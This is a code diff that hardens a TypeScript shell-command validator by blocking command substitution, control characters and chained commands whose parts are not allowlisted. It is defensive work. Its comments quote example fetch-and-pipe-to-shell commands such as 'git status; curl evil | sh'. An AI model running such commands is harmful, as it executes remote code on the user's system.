@@ -88,6 +88,22 @@ const BLOCKED_PATTERNS = [
 ];
 
 /**
+ * Command-substitution patterns that would cause the shell to evaluate an
+ * arbitrary sub-command BEFORE the allowlist check runs (e.g. `git $(curl ... | sh)`
+ * evaluates to whatever the curl prints). These bypass the allowlist entirely
+ * regardless of which base command is used, so they must be rejected outright.
+ */
+const SUBSTITUTION_PATTERNS = [
+  /\$\(/,   // $(...)  — command substitution
+  /`/,      // `...`   — backtick command substitution
+  /<\(/,    // <(...)  — process substitution (bash)
+  />\(/,    // >(...)  — process substitution (bash)
+];
+
+/** Chaining operators that let users combine commands in one request. */
+const CHAIN_OPERATORS = /&&|\|\||;|(?<!\|)\|(?!\|)/;
+
+/**
  * Extracts the base command from a command string.
  * Handles common prefixes like environment variables and sudo.
  */
@@ -119,29 +135,58 @@ function extractBaseCommand(command: string): string | null {
 /**
  * Validates a command string against the allowlist and blocklist.
  * Returns an object with validation result and error message if blocked.
+ *
+ * Three layers of defense, applied in order:
+ *   1. Reject command substitution (`$(...)`, backticks, process substitution),
+ *      which would otherwise let an allowlisted base command run an arbitrary
+ *      inner command before validation completes.
+ *   2. Reject known-dangerous literal patterns.
+ *   3. Split on chain operators (`;`, `&&`, `||`, `|`) and require *every*
+ *      segment's base command to be in the allowlist — without this, a chain
+ *      like `git status; curl evil | sh` would pass because only the first
+ *      token is checked.
  */
 export function validateCommand(command: string): { valid: boolean; error?: string } {
-  // Check for blocked patterns first (defense in depth)
+  // Reject command substitution outright — it bypasses the allowlist.
+  for (const pattern of SUBSTITUTION_PATTERNS) {
+    if (pattern.test(command)) {
+      return { valid: false, error: "Command substitution is not allowed" };
+    }
+  }
+
+  // Reject control characters and NUL bytes defensively.
+  if (/[\0\r\n]/.test(command)) {
+    return { valid: false, error: "Command contains invalid control characters" };
+  }
+
+  // Check for blocked patterns (defense in depth).
   for (const pattern of BLOCKED_PATTERNS) {
     if (pattern.test(command)) {
       return { valid: false, error: "Command contains dangerous patterns and is not allowed" };
     }
   }
-  
-  // Extract base command
-  const baseCommand = extractBaseCommand(command);
-  if (!baseCommand) {
-    return { valid: false, error: "Could not parse command" };
+
+  // Split on chaining operators and validate each segment. Without this, a
+  // chain like `git status; curl ... | sh` passes with only the first base
+  // command checked.
+  const segments = command.split(CHAIN_OPERATORS);
+  for (const raw of segments) {
+    const segment = raw.trim();
+    if (segment.length === 0) continue;
+
+    const baseCommand = extractBaseCommand(segment);
+    if (!baseCommand) {
+      return { valid: false, error: "Could not parse command" };
+    }
+
+    if (!ALLOWED_COMMANDS.has(baseCommand)) {
+      return {
+        valid: false,
+        error: `Command '${baseCommand}' is not in the allowed command list. Allowed commands: ${Array.from(ALLOWED_COMMANDS).sort().join(", ")}`,
+      };
+    }
   }
-  
-  // Check allowlist
-  if (!ALLOWED_COMMANDS.has(baseCommand)) {
-    return { 
-      valid: false, 
-      error: `Command '${baseCommand}' is not in the allowed command list. Allowed commands: ${Array.from(ALLOWED_COMMANDS).sort().join(", ")}` 
-    };
-  }
-  
+
   return { valid: true };
 }
 
